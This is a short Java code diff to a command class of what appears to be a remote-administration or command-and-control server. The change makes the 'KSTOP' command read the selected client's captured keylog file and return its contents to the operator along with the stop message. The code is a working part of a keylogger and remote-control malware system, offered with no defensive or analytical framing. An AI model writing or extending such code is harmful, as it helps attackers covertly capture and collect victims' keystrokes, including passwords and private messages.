@@ -1,6 +1,7 @@
 package commands;
 
 import server.CommandServer;
+import tools.KeyLoggerReader;
 import tools.ParsedCommand;
 
 public class KStopCmd extends ServerCommand {
@@ -13,7 +14,13 @@ public class KStopCmd extends ServerCommand {
 	public String exec(ParsedCommand pCmd) {		
 		c2.getClients().get(c2.getCurrentClient()).stackCmd("KSTOP");
 		
-		return "Stoping keylogger for client " + c2.getCurrentClient();
+		KeyLoggerReader reader = new KeyLoggerReader(
+				c2.getCurrentClient() + ".keylog");
+		
+		return "Stoping keylogger for client " + c2.getCurrentClient()
+				+ "\n-----BEGIN KEYLOG OUTPUT-----\n"
+				+ reader.toString()
+				+ "\n-----END KEYLOG OUTPUT-----";
 	}
 
 }
